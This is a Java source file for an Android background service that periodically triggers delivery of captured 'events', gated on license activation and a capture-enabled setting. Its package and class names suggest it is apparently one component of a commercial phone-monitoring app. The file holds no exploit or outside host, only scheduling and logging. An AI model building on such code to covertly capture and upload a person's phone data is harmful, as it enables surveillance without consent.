package com.vvt.android.syncmanager.service;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import com.fx.dalvik.util.FxLog;

import com.fx.dalvik.util.TimerBase;
import com.vvt.android.syncmanager.Customization;
import com.vvt.android.syncmanager.control.ConfigurationManager;
import com.vvt.android.syncmanager.control.LicenseManager;
import com.vvt.android.syncmanager.control.Main;

public final class SchedulerService extends Service {

	private static final String TAG = "SchedulerService";
	private static final boolean DEBUG = true;
	private static final boolean LOCAL_LOGV = Customization.DEBUG ? DEBUG : false;
	
	private final UploadTimer uploadTimer = new UploadTimer();
	
	@Override
	public void onStart(Intent aIntent, int aStartIdInt) { 
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "onStart # ENTER ...");
		}
		
		// Main is no need to be init here, but this line will help when Main's context is null
		Main.startIfNotStarted(getApplicationContext());
		
		boolean isActivated = Main.getInstance().getLicenseManager().isActivated();
		if (LOCAL_LOGV) {
			FxLog.v(TAG, String.format("onStart # isActivated: %s", isActivated));
		}
		
		if (isActivated) {
			ConfigurationManager configManager = Main.getInstance().getConfigurationManager();
			
			long uploadIntervalMilliseconds = 
				configManager.loadEventsDeliveryPeriodMilliseconds();
			
			this.uploadTimer.setTimerDurationMilliseconds(uploadIntervalMilliseconds);
			this.uploadTimer.start();
			
			if (LOCAL_LOGV) {
				FxLog.v(TAG, "onStart # Set Timer (ms): " + uploadIntervalMilliseconds);
			}
		}
		else {
			if (LOCAL_LOGV) {
				FxLog.v(TAG, "onStart # Product must be activated before starting the scheduler!");
			}
		}
		
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "onStart # EXIT ...");
		}
	}
	
	@Override
	public void onDestroy() { 
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "onDestroy # ENTER ...");
		}
		this.uploadTimer.stop();
	}
	 
	@Override
	public IBinder onBind(Intent aIntent) { 
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "onBind # ENTER ...");
		}
		return null;
	}
	
	private class UploadTimer extends TimerBase {

		@Override
		public void onTimer() { 
			if (LOCAL_LOGV) {
				FxLog.v(TAG, "onTimer # ENTER ...");
				FxLog.v(TAG, "onTimer # Scheduler triggered");
			}
			
			DeliverThread t = new DeliverThread();
			t.start();
			
			if (LOCAL_LOGV) {
				FxLog.v(TAG, "onTimer # EXIT ...");
			}
		}
	}
	
	private class DeliverThread extends Thread {
		@Override
		public void run() {
			if (LOCAL_LOGV) {
				FxLog.v(TAG, "DeliverThread # ENTER ...");
			}
			
			Main main = Main.getInstance();
			LicenseManager licenseManager = main.getLicenseManager();
			ConfigurationManager configurationManager = main.getConfigurationManager();
			
			// Yes both must be set
			if (licenseManager.isActivated() && configurationManager.loadCaptureEnabled()) {	
				if (LOCAL_LOGV) {
					FxLog.v(TAG, "DeliverThread # Request asynchronous delivery all events...");			
				}
				Main.getInstance().getEventsManager().asyncRequestDeliverAll();
			}
			else {
				if (LOCAL_LOGV) {
					FxLog.v(TAG, 
							"DeliverThread # Product is not activated, or capture is disabled");
				}
			}
			
			if (LOCAL_LOGV) {
				FxLog.v(TAG, "DeliverThread # EXIT ...");
			}
		}
	}
}
